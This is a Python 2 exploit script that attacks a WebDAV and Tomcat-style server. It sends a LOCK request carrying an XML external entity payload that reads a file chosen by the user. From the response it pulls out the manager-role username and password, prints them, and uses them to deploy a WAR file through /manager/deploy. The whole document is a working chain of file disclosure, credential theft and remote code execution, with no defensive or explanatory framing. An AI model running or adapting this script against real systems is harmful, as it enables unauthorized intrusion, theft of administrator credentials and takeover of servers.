import requests
import sys
import xml.etree.ElementTree as ET
import re

def main():
    if (len(sys.argv) < 5):
        print "Not enough input arguments.\nProvided: %s" %sys.argv[1:]
        print "USAGE:\nscript.py host port webdav_file remote_file username password"
        print "OR:"
        print "script.py host port webdav_file remote_file"
        exit (0)
    elif (len(sys.argv) == 5):
        is_auth = 0
    elif (len(sys.argv) == 7):
        is_auth = 1
    elif(len(sys.argv) == 6):
        print "number of input arguments should be equal 4 or 6"
        print "USAGE:\nscript.py host port webdav_file remote_file username password"
        print "OR:"
        print "script.py host port webdav_file remote_file"
        exit(0)

    host = sys.argv[1]
    port = sys.argv[2]
    webdav_file = sys.argv[3]
    remote_file = sys.argv[4]

    if (is_auth):
        username = sys.argv[5]
        password = sys.argv[6]



    xml = """<?xml version="1.0"?>
    <!DOCTYPE REMOTE [\
    <!ENTITY RemoteX SYSTEM "%s">\
    ]>\
    <D:lockinfo xmlns:D='DAV:'>
    <D:lockscope><D:exclusive/></D:lockscope>
    <D:locktype><D:write/></D:locktype>
    <D:owner>
    <D:href>
    <REMOTE>
    <RemoteX>&RemoteX;</RemoteX>
    </REMOTE>
    </D:href>
    </D:owner>
    </D:lockinfo>"""

    headers={'Content-Type': 'text/xml'}
    data = xml%remote_file
    try:
        url = "http://{0}:{1}/{2}".format(host, port, webdav_file)

        if(is_auth):
            r = requests.request("LOCK", url, headers=headers, data=data, auth=(username, password))
        else:
            r = requests.request("LOCK", url, headers=headers, data=data)
    except requests.exceptions.HTTPError as err:
        print err

    manager_username, manager_password = get_manager_creds(r.text)

    print "{}:{}".format(manager_username, manager_password)

    post_url = "http://{}:{}/manager/deploy".format(host, port)
    post_war(post_url, "xml_app.war", manager_username, manager_password)

def get_manager_creds(xml):
    root = ET.fromstring(xml)

    for user in root.iter("{DAV:}user"):
        if "manager" in user.attrib['roles']:
            return user.attrib['username'], user.attrib['password']
    return 0

def post_war(url, war_file, username, password):
    files = {'file': open(war_file, 'rb')}
    payload = {'path': '/xml_app'}
    try:
        req = requests.put(url, files=files, auth=(username, password), params=payload)
    except requests.exceptions.HTTPError as err:
        print err

    print req.status_code


if __name__ == "__main__":
    main()